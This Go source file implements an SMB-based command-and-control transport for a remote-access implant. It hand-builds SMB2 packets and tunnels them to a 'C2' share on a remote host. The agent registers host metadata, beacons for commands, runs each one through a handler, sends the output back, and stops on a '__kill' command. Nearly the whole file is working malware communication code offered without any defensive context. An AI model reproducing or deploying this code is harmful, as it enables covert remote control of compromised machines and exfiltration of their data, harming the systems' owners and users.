//go:build transport_smb

package main

import (
	"encoding/binary"
	"net"
	"time"
)

type ActiveTransport struct {
	host      string
	port      string
	encryptFn func(string) (string, error)
	decryptFn func(string) (string, error)
}

func NewActiveTransport(scheme, host, port, ua, regURI, ciURI, resURI string,
	encFn func(string) (string, error), decFn func(string) (string, error)) *ActiveTransport {
	return &ActiveTransport{host: host, port: port, encryptFn: encFn, decryptFn: decFn}
}

func smbHdr(command uint16, messageID uint64, sessionID uint64, treeID uint32) []byte {
	hdr := make([]byte, 64)
	copy(hdr, []byte{0xfe, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(hdr[4:6], 64)
	binary.LittleEndian.PutUint16(hdr[12:14], command)
	binary.LittleEndian.PutUint16(hdr[14:16], 1)
	binary.LittleEndian.PutUint32(hdr[16:20], 1)
	binary.LittleEndian.PutUint64(hdr[24:32], messageID)
	binary.LittleEndian.PutUint32(hdr[36:40], treeID)
	binary.LittleEndian.PutUint64(hdr[40:48], sessionID)
	return hdr
}

func smbFrame(body []byte) []byte {
	out := make([]byte, 4+len(body))
	n := len(body)
	out[1] = byte(n >> 16)
	out[2] = byte(n >> 8)
	out[3] = byte(n)
	copy(out[4:], body)
	return out
}

func (t *ActiveTransport) roundTrip(payload string) (string, error) {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(t.host, t.port), 8*time.Second)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(8 * time.Second))
	rpc := func(body []byte) ([]byte, error) {
		if _, err := conn.Write(smbFrame(body)); err != nil {
			return nil, err
		}
		hdr := make([]byte, 4)
		if _, err := readFull(conn, hdr); err != nil {
			return nil, err
		}
		n := int(hdr[1])<<16 | int(hdr[2])<<8 | int(hdr[3])
		buf := make([]byte, n)
		if _, err := readFull(conn, buf); err != nil {
			return nil, err
		}
		return buf, nil
	}
	neg := append(smbHdr(0, 1, 0, 0), make([]byte, 38)...)
	binary.LittleEndian.PutUint16(neg[64:66], 36)
	binary.LittleEndian.PutUint16(neg[66:68], 1)
	binary.LittleEndian.PutUint16(neg[100:102], 0x0210)
	if _, err = rpc(neg[:64+36+2]); err != nil {
		return "", err
	}
	if _, err = rpc(append(smbHdr(1, 2, 0, 0), make([]byte, 26)...)); err != nil {
		return "", err
	}
	tree := append(smbHdr(3, 3, 0x1000, 0), []byte{9, 0, 72, 0, 8, 0}...)
	tree = append(tree, []byte{'C', 0, '2', 0}...)
	if _, err = rpc(tree); err != nil {
		return "", err
	}
	name := []byte{'r', 0, 'e', 0, 'q', 0}
	create := make([]byte, 64+len(name))
	binary.LittleEndian.PutUint16(create[0:2], 57)
	binary.LittleEndian.PutUint16(create[44:46], 128)
	binary.LittleEndian.PutUint16(create[46:48], uint16(len(name)))
	copy(create[64:], name)
	if _, err = rpc(append(smbHdr(5, 4, 0x1000, 1), create...)); err != nil {
		return "", err
	}
	blob := []byte(payload)
	write := make([]byte, 48+len(blob))
	binary.LittleEndian.PutUint16(write[0:2], 49)
	binary.LittleEndian.PutUint16(write[2:4], 112)
	binary.LittleEndian.PutUint32(write[4:8], uint32(len(blob)))
	write[16] = 0x10
	copy(write[48:], blob)
	if _, err = rpc(append(smbHdr(9, 5, 0x1000, 1), write...)); err != nil {
		return "", err
	}
	read := make([]byte, 49)
	binary.LittleEndian.PutUint16(read[0:2], 49)
	binary.LittleEndian.PutUint32(read[4:8], 1024*1024)
	read[16] = 0x20
	reply, err := rpc(append(smbHdr(8, 6, 0x1000, 1), read...))
	if err != nil {
		return "", err
	}
	dataOff := int(binary.LittleEndian.Uint16(reply[66:68]))
	length := int(binary.LittleEndian.Uint32(reply[68:72]))
	return string(reply[dataOff : dataOff+length]), nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	n := 0
	for n < len(buf) {
		got, err := conn.Read(buf[n:])
		n += got
		if err != nil {
			return n, err
		}
	}
	return n, nil
}

func (t *ActiveTransport) Register(metadata map[string]interface{}) (string, error) {
	msg := map[string]interface{}{"type": "register", "metadata": metadata}
	raw, _ := jsonMarshal(msg)
	enc, err := t.encryptFn(string(raw))
	if err != nil {
		return "", err
	}
	resp, err := t.roundTrip(enc)
	if err != nil {
		return "", err
	}
	dec, err := t.decryptFn(resp)
	if err != nil {
		return "", err
	}
	return parseID(dec)
}

func (t *ActiveTransport) Checkin(agentID string, results []map[string]interface{}) ([]map[string]interface{}, error) {
	if results == nil {
		results = []map[string]interface{}{}
	}
	msg := map[string]interface{}{
		"type": "checkin", "agent_id": agentID,
		"metadata": map[string]interface{}{"mode": "beacon", "hostname": "smb-agent"},
		"results":  results,
	}
	raw, _ := jsonMarshal(msg)
	enc, err := t.encryptFn(string(raw))
	if err != nil {
		return nil, err
	}
	resp, err := t.roundTrip(enc)
	if err != nil {
		return nil, err
	}
	dec, err := t.decryptFn(resp)
	if err != nil {
		return nil, err
	}
	return parseCommands(dec)
}

func (t *ActiveTransport) SendResult(agentID, command, output string) error { return nil }
func (t *ActiveTransport) StartStreaming(agentID string, handler func(string) string) error {
	var pending []map[string]interface{}
	for {
		cmds, err := t.Checkin(agentID, pending)
		if err != nil {
			time.Sleep(1 * time.Second)
			continue
		}
		pending = nil
		for _, cmd := range cmds {
			command, _ := cmd["command"].(string)
			if command == "__kill" {
				return nil
			}
			if command == "" {
				continue
			}
			pending = append(pending, map[string]interface{}{
				"type": "response", "command": command, "output": handler(command),
			})
		}
		time.Sleep(1 * time.Second)
	}
}
func (t *ActiveTransport) Close() {}
